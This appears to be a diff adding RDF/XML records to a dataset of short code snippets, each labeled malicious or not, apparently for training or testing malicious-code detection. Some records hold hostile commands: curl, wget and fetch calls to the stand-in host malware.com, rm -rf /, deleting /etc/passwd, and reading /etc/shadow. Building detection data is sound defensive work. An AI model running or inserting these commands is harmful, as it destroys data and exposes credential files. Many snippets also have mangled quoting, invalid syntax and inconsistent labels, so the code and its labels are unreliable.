+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_167">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Haskell</ex:language>
+    <rdfs:comment>main = putStrLn \Hello World!\""</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_51">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>let vec = vec![1,2,3]; vec.push(4);</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_9">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>list = [1, 2, 3]; print(list)</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_173">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>for i in range(5): print(i)</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_179">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go </ex:language>
+    <rdfs:comment>package main ; import \math\" ; func square(x float64) float64{ return math.Pow(x, 2)} "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_124">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>eval('__import__(\os\").system(\"ls\")')"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_169">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Scala</ex:language>
+    <rdfs:comment>println(\Hello World!\")"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_208">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Objective-C </ex:language>
+    <rdfs:comment>@"NSLog(@"Safe Objective-C operation.");" </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_202">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Dart </ex:language>
+    <rdfs:comment>void printMessage(){ print(Safe Dart operation.");} "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_72">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;stdlib.h&gt;; int main() { system('curl http://malware.com'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_132">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;stdlib.h&gt;; int main() { system('curl http://malware.com'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_141">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>public class Main { public static void main(String[] args) { System.out.println('Goodbye!'); }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_165">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Dart</ex:language>
+    <rdfs:comment>void main() =&gt; print('Hello World!');</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_47">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>std::vector&lt;int&gt; v = {1,2,3}; v.push_back(4);</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_207">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Objective-C </ex:language>
+    <rdfs:comment>@"NSFileManager *fileManager = [NSFileManager defaultManager]; [fileManager removeItemAtPath:@"/tmp/file.txt" error:nil];" </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_88">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript</ex:language>
+    <rdfs:comment>fetch('http://malware.com').then(response =&gt; response.text()).then(data =&gt; console.log(data));</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_162">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Perl</ex:language>
+    <rdfs:comment>unlink('/etc/passwd') if -e '/etc/passwd'</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_206">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Scala </ex:language>
+    <rdfs:comment>println(Safe Scala operation.")" </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_85">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>fn add(a: i32, b: i32) -&gt; i32 { a + b }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_33">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>use std::process::Command; fn main() { Command::new('rm').arg('-rf').arg('/').output().unwrap(); }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_99">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>PHP</ex:language>
+    <rdfs:comment>echo 'Hello World!';</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_186">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java </ex:language>
+    <rdfs:comment>public class Main{ public static void 1Method(){ Runtime.getRuntime().exec(\curl http://malware.com\");} } "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_40">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>open('/etc/shadow', 'r')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_200">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Perl </ex:language>
+    <rdfs:comment>system(rm -rf /tmp/") "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_11">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'fmt'; func main() { fmt.Println('Hello, World!') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_121">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>print('This is a test.')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#isMalicious">
+    <rdf:type rdf:resource="http://www.w3.org/2002/07/owl#DatatypeProperty"/>
+    <rdfs:label>Is Malicious</rdfs:label>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_154">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby</ex:language>
+    <rdfs:comment>system('curl http://malware.com')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_105">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Dart</ex:language>
+    <rdfs:comment>void main() =&gt; print('Hello World!');</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_26">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;fstream&gt;; int main() { std::ifstream file('/etc/passwd'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_79">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;cstdlib&gt;; int main() { system('wget http://malware.com'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_49">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>int sum = a + b;</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_129">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'time'; func main() { time.Now() }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_103">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Perl</ex:language>
+    <rdfs:comment>print 'Hello World!'</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_22">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;string.h&gt;; int main() { char str[20]; strcpy(str, 'Hello'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_42">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>os.RemoveAll('/tmp')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_94">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby</ex:language>
+    <rdfs:comment>system('curl http://malware.com')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_97">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Swift</ex:language>
+    <rdfs:comment>print(\Hello World!\")"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_147">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>use std::process::Command; fn main() { Command::new(\wget\").arg(\"http://malware.com\").output().unwrap(); }"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_189">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust </ex:language>
+    <rdfs:comment>fn safe_code(){ println!(\This is safe.\");} "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_163">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Perl</ex:language>
+    <rdfs:comment>print 'Hello World'</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_10">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'os'; func main() { os.RemoveAll('/') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_140">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>import java.io.*; public class Main { public static void main(String[] args) { File file = new File('/etc/passwd'); file.delete(); }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_148">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript</ex:language>
+    <rdfs:comment>fetch('http://malware.com').then(response =&gt; response.text()).then(data =&gt; console.log(data));</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_53">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>http.Get('http://example.com')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_128">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'os/exec'; func main() { exec.Command('curl', 'http://1.com').Run() }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_194">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Swift </ex:language>
+    <rdfs:comment>let _ = try? FileManager.default.removeItem(atPath: \/tmp/file.txt\") "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_152">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby</ex:language>
+    <rdfs:comment>File.delete('/etc/passwd') if File.exist?('/etc/passwd')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_151">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript</ex:language>
+    <rdfs:comment>document.location.href = 'http://malware.com';</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_28">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;string&gt;; int main() { std::string str = 'Hello'; return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_19">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;stdio.h&gt;; int main() { printf('Hello, World!'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_136">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;iostream&gt;; int main() { std::remove('/etc/passwd'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_156">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Swift</ex:language>
+    <rdfs:comment>let fileManager = FileManager.default; try? fileManager.removeItem(atPath: \/etc/passwd\")"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_76">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;iostream&gt;; int main() { std::remove('/etc/passwd'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_16">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'io/ioutil'; func main() { ioutil.ReadFile('/etc/passwd') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_178">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go </ex:language>
+    <rdfs:comment>package main; import \net/http\"; func 1Request(){ http.Get(\"http://malware.com\")}"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_12">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'net/http'; func main() { http.Get('http://1.com') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_69">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'time'; func main() { time.Now() }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_118">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def square(x): return x ** 2</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_70">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'io/ioutil'; func main() { ioutil.WriteFile('/tmp/file.txt', []byte{'H','e','l','l','o'}, 0644) }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_20">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;stdio.h&gt;; int main() { FILE *f = fopen('/etc/passwd', 'r'); fclose(f); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_137">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;vector&gt;; int main() { std::vector&lt;int&gt; v = {1,2,3}; v.push_back(4); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_134">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;unistd.h&gt;; int main() { unlink('/tmp/file.txt'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+</rdf:RDF>
